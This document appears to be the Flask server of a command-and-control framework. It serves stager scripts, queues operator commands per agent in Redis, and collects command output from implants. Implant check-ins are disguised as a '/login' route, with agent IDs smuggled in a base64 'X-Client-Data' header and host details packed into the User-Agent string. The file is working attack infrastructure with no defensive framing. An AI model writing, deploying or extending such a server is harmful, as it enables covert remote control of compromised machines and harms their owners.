from flask import Flask, request, Response, jsonify, send_from_directory
import redis
from functions import *
import os
import base64

# db_path = "/app/data/agents.db" # Docker volume DB path

r = redis.Redis(host=os.getenv('REDIS_HOST'), port=6379, db=0, decode_responses=True)

app = Flask(__name__)

@app.route('/<string:script>', methods=['GET'])
def stager(script):
    return send_from_directory('scripts', script, as_attachment=False)

@app.route('/admin', methods=['POST'])
def send_command():
    data = request.json
    if request.method == 'POST':
        uuid = data.get('uuid')
        cmd = data.get('command')
        r.rpush(uuid, cmd)
        if r.llen(uuid) > 100:
            r.lpop(uuid)
    return "Command Sent!"

@app.route('/login', methods=['GET', 'POST'])
def commander():
    b64 = base64.b64decode(request.headers.get("X-Client-Data"))
    uuid = b64.decode('utf-8')
    if request.method == 'GET':
        raw_profile = request.headers.get("User-Agent").split("/", 3)
        profile = raw_profile[0]
        hostname = raw_profile[2]
        ip = request.remote_addr
        cache = r.lindex(uuid, -1)
        if r.exists(uuid) == 0:
            command = register_agent(uuid, profile, ip, hostname)

        elif "SEEN" in cache or "AGENT REGISTERED" in cache:
            update_seen(uuid)
            command = ""
        else:
            update_seen(uuid)
            command = cache
            r.rpush(uuid, "SEEN")
            small_check(uuid)
        return command

    elif request.method == 'POST':
        data = request.data
        if uuid and data:
            key = f"{uuid}-output"
            r.publish(key, data)
        return "Success"
    else:
        return "Invalid Method"


# This allows you to run the app directly with `python app.py`
if __name__ == '__main__':
    app.run(debug=True)